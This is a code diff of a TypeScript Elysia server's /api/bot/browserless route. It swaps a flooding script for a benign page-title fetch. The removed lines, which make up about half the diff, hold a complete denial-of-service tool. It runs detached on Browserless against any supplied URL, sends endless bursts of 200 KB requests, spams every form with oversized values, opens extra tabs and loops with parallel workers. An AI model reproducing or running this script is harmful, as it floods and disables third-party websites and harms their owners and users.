@@ -356,111 +356,62 @@ export const app = new Elysia()
     }),
   })
   // ==================== BROWSERLESS DITINGKATKAN (BERBAHAYA) ====================
-  .post('/api/bot/browserless', async ({ body }) => {
-    const { url, loop, intervalMs } = body;
-    const apiKey = process.env.BROWSERLESS_API_KEY;
-    if (!apiKey) return { success: false, error: 'Missing BROWSERLESS_API_KEY' };
+// ==================== PERBAIKAN BROWSERLESS BOT ====================
+.post('/api/bot/browserless', async ({ body }) => {
+  const { url } = body;
+  const apiKey = process.env.BROWSERLESS_API_KEY;
+  if (!apiKey) return { success: false, error: 'Missing API key' };
 
-    // Skrip yang sangat agresif untuk membombardir target melalui headless browser
-    const attackScript = `
-      export default async ({ page, context }) => {
-        const targetUrl = context.url;
-        const baseUrl = targetUrl.endsWith('/') ? targetUrl : targetUrl + '/';
-        
-        // Fungsi untuk membombardir dengan fetch dalam jumlah besar
-        const flood = async () => {
-          const payload = 'A'.repeat(1024 * 200); // 200 KB
-          const endpoints = ['/', '/api', '/login', '/register', '/search', '/submit', '/contact'];
-          const methods = ['GET', 'POST', 'PUT', 'DELETE'];
-          while (true) {
-            const tasks = [];
-            for (let i = 0; i < 50; i++) {
-              const method = methods[i % methods.length];
-              const endpoint = endpoints[i % endpoints.length];
-              tasks.push(
-                fetch(baseUrl + endpoint, {
-                  method,
-                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                  body: method === 'GET' ? undefined : payload,
-                  mode: 'no-cors'
-                }).catch(() => {})
-              );
-            }
-            await Promise.all(tasks);
-            await new Promise(r => setTimeout(r, 5));
-          }
-        };
+  // Script yang lebih stabil dan ringan (tidak melakukan banyak navigasi yang bisa gagal)
+  const script = `
+module.exports = async ({ page, context }) => {
+  const targetUrl = context.url;
+  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
+  // Scroll ke bawah
+  await page.evaluate(() => {
+    window.scrollTo(0, document.body.scrollHeight);
+  });
+  await new Promise(resolve => setTimeout(resolve, 2000));
+  const title = await page.title();
+  return {
+    data: {
+      ok: true,
+      title,
+      url: targetUrl,
+    },
+    type: 'application/json'
+  };
+};
+`;
 
-        // Serang melalui submit form
-        const spamForms = async () => {
-          while (true) {
-            const forms = document.querySelectorAll('form');
-            for (const form of forms) {
-              const inputs = form.querySelectorAll('input:not([type=submit])');
-              for (const inp of inputs) {
-                try { inp.value = 'X'.repeat(10000); } catch(e) {}
-              }
-              try { form.submit(); } catch(e) {}
-            }
-            await new Promise(r => setTimeout(r, 300));
-          }
-        };
-
-        // Buka banyak halaman sekaligus
-        const browser = page.browser();
-        for (let i = 0; i < 5; i++) {
-          browser.newPage().then(p => {
-            p.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
-            flood();
-            spamForms();
-          }).catch(() => {});
-        }
-
-        // Serang di halaman utama
-        await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {});
-        flood();
-        spamForms();
-
-        // Biarkan berjalan selama 1 menit
-        await new Promise(resolve => setTimeout(resolve, 60000));
-        return { data: { status: 'attack_complete' }, type: 'application/json' };
-      }
-    `;
-
-    const executeAttack = async () => {
-      try {
-        await fetch(`https://production-sfo.browserless.io/function?token=${apiKey}&detach=true`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ code: attackScript, context: { url } }),
-        });
-      } catch (e) {
-        // abaikan error jaringan
-      }
-    };
-
-    if (loop) {
-      const interval = intervalMs || 2000;
-      const concurrency = 3; // jumlah worker paralel
-      for (let i = 0; i < concurrency; i++) {
-        const loopAttack = async () => {
-          await executeAttack();
-          setTimeout(loopAttack, interval);
-        };
-        loopAttack(); // jalankan tanpa menunggu
-      }
-      return { success: true, message: `Serangan browserless berkelanjutan dimulai dengan ${concurrency} worker paralel` };
-    } else {
-      await executeAttack();
-      return { success: true, message: 'Satu serangan browserless telah diluncurkan (detached)' };
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 30000);
+    const response = await fetch('https://chrome.browserless.io/function?token=' + apiKey, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ code: script, context: { url } }),
+      signal: controller.signal,
+    });
+    clearTimeout(timeoutId);
+    const text = await response.text();
+    if (!response.ok) {
+      return { success: false, error: `Browserless API error (${response.status}): ${text.slice(0, 500)}` };
     }
-  }, {
-    body: t.Object({
-      url: t.String(),
-      loop: t.Optional(t.Boolean()),
-      intervalMs: t.Optional(t.Number()),
-    }),
-  })
+    let result: unknown = text;
+    try { result = JSON.parse(text); } catch {}
+    return { success: true, result };
+  } catch (err: any) {
+    console.error('Browserless fetch error:', err);
+    return { success: false, error: err.message };
+  }
+}, {
+  body: t.Object({
+    url: t.String(),
+    loop: t.Optional(t.Boolean()),
+    intervalMs: t.Optional(t.Number()),
+  }),
+})
   .get('/api/heartbeat', ({ request }) => {
     const ip = request.headers.get('x-forwarded-for') || 'unknown';
     const ua = request.headers.get('user-agent') || 'unknown';
